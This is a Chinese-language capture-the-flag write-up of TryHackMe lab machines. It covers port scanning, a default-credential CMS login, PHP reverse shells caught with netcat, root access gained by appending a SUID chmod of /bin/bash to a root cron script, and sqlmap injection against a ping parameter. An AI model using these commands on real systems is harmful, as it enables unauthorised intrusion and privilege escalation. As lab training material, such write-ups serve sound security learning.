# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# Easy Challenge

# 服务发现
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nmap -sV -Pn 10.10.134.251    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 04:36 EDT
Nmap scan report for 10.10.134.251
Host is up (0.31s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
9999/tcp open  abyss?
```

# 爆破8000端口的目录
```
──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u 10.10.134.251:8000

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 6100

Error Log: /root/dirsearch/logs/errors-21-10-25_04-57-13.log

Target: 10.10.134.251:8000                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
[04:57:13] Starting: 
[04:57:22] 200 -    2KB - /about                                                 
[04:57:33] 200 -    2KB - /contact                                                                                
[04:57:47] 500 -  613B  - /public_html/robots.txt                                                              
[04:57:47] 200 -   30B  - /robots.txt             
```

```robots.txt```显示有一个cms
```
User-agent: *
Disallow: /vbcms
```

打开是一个登陆页面，尝试用```admin:admin```登陆，居然登陆上了。。。

登陆进去是一个页面编辑界面，可以直接改网页源代码，尝试写php发现可以运行，那就简单了，直接写shell。。。

开启一个端口监听，把shell写进首页，访问，触发反弹
```
┌──(root💀kali)-[~/tryhackme/hackerhill]
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.134.251] 59268
Linux web-serv 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:30:53 up  1:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(serv1) gid=1000(serv1) groups=1000(serv1),43(utmp)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(serv1) gid=1000(serv1) groups=1000(serv1),43(utmp)
$ whoami
serv1

```

根据提示，第一个flag在```/usr/games/fortune```，去到[这个网站](https://ctf.hacker101.com/ctf/flagcheck)兑换到tryhackme需要的flag

然后第二个，第三个按照指示去到```/var/lib/rary```和```/var/www/serv4/index.php```起上面网站兑换指定flag

# 提权
传linpeas.sh，发现```/home/serv3/backups/backup.sh```这个定时任务是用root身份执行的，频率为一分钟一次

查看bash文件权限
```
serv1@web-serv:/tmp$ ls -alh /home/serv3/backups/backup.sh
ls -alh /home/serv3/backups/backup.sh
-r-xr-xr-x 1 serv3 serv3 52 Feb 15  2021 /home/serv3/backups/backup.sh
```

serv1没有权限编辑这个文件，也就是说我们需要横向提权到serv3？


在```/var/www/html/topSecretPrivescMethod```找到一个secret.txt，看文件夹名字是提权方法，但是打开是一串乱码

在```:8002/lesson/1```这个php运行页面，本来可以直接运行php反弹shell，但是因为页面连接了一个谷歌前端框架，我kali不能翻墙，所以不能运行反弹不了shell

于是研究了下怎么在linux下连v2ray，终于找到了[这篇文章](https://zhuanlan.zhihu.com/p/359755946),按照里面的方法fq成功


回到上面那个页面，写入php反弹shell，拿到serv3的shell

```
┌──(root💀kali)-[~/tryhackme/hackhill]
└─# nc -lnvp 4444                                                        1 ⨯
listening on [any] 4444 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.172.149] 33814
Linux web-serv 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:49:20 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1002(serv3) gid=1002(serv3) groups=1002(serv3)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(serv3) gid=1002(serv3) groups=1002(serv3)
```

我们写入下面命令到backup.sh，使得bash命令成为一个SUID
```echo "chmod 4777 /bin/bash" >> /home/serv3/backups/backup.sh```

等待一分钟以后，执行```/bin/bash -p```拿到root权限
```
serv3@web-serv:/$ /bin/bash -p                                                                                                                                                                                                               
/bin/bash -p                                                                                                                                                                                                                                 
bash-4.4# id                                                                                                                                                                                                                                 
id                                                                                                                                                                                                                                           
uid=1002(serv3) gid=1002(serv3) euid=0(root) groups=1002(serv3)                                                                                                                                                                              
bash-4.4# cat /root/root.txt    
```

#  Medium Challenge

# 服务发现

```
┌──(root💀kali)-[~/tryhackme/hackhill]
└─# nmap -sV -Pn 10.10.2.131                                                                                                                                                                                                         130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 10:00 EDT
Nmap scan report for 10.10.2.131
Host is up (0.32s latency).
Not shown: 985 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
81/tcp   open  http          Microsoft IIS httpd 10.0
82/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-25 14:01:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: troy.thm0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
9999/tcp open  abyss?
```

中等难度是一台windows机器，开了很多服务，一个个查看

80,81,82都是http服务，逐个爆破目录

# 80
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.2.131

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.2.131/_21-10-25_10-10-52.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-10-52.log

Target: http://10.10.2.131/

[10:10:53] Starting: 
[10:11:00] 200 -    2KB - /%3f/                                            
[10:11:00] 403 -  312B  - /%2e%2e//google.com                              
[10:11:00] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[10:11:09] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[10:11:28] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[10:11:33] 302 -    0B  - /dashboard  ->  /login                            
[10:11:48] 200 -    3KB - /login                                            
[10:11:48] 200 -    3KB - /login/                                           
[10:11:49] 302 -    0B  - /logout/  ->  /                                   
[10:11:49] 302 -    0B  - /logout  ->  /                                    
[10:12:26] 302 -    0B  - /profile  ->  /login                              
[10:12:45] 200 -    3KB - /signup 
```

# 81
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.2.131:81

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.2.131-81/_21-10-25_10-27-15.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-27-15.log

Target: http://10.10.2.131:81/

[10:27:16] Starting: 
[10:27:22] 200 -    5KB - /%3f/                                            
[10:27:22] 403 -  312B  - /%2e%2e//google.com                              
[10:27:23] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[10:27:31] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[10:27:57] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[10:28:32] 400 -   24B  - /ping     
```

# 82
```
┌──(root💀kali)-[~/tryhackme/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.2.131:82

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/tryhackme/dirsearch/reports/10.10.2.131-82/_21-10-25_10-29-15.txt

Error Log: /root/tryhackme/dirsearch/logs/errors-21-10-25_10-29-15.log

Target: http://10.10.2.131:82/

[10:29:16] Starting: 
[10:29:24] 403 -  312B  - /%2e%2e//google.com                              
[10:29:25] 404 -    1KB - /+CSCOE+/session_password.html                   
[10:29:25] 404 -    1KB - /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
[10:29:25] 404 -    1KB - /+CSCOE+/logon.html#form_title_text              
[10:29:25] 404 -    1KB - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
[10:29:25] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[10:29:26] 404 -    1KB - /.config/psi+/profiles/default/accounts.xml      
[10:29:41] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[10:30:15] 404 -    1KB - /bitrix/web.config                                
[10:30:17] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[10:30:19] 404 -    1KB - /cms/Web.config                                   
[10:30:30] 404 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[10:30:41] 404 -    1KB - /lang/web.config                                  
[10:30:50] 404 -    1KB - /modules/web.config                               
[10:31:00] 404 -    1KB - /plugins/web.config                               
[10:31:19] 404 -    1KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt-orig.sql
[10:31:19] 404 -    1KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt.sql
[10:31:24] 404 -    1KB - /web.config  
```

80服务运行一个上传服务，但是只能指定```.jpg```文件上传，试了绕不过去
81服务运行了一个ping域名的服务，尝试命令行绕过，貌似不行
82服务没看到啥有用的东西

81端口看url```:81/ping?id=6```，测试了一下，存在sql注入，那么应该这个才是攻击点

# 枚举数据库
```
sqlmap -u "http://10.10.2.131:81/ping?id=6" -p "id"  --batch --dbms=mysql --technique B --dbs
available databases [2]:
[*] information_schema
[*] networkmonitor

```

# 其他信息
>数据表：host 表字段：id,ip
>用户名：'monitor_read'@'localhost'
>密码：枚举不出来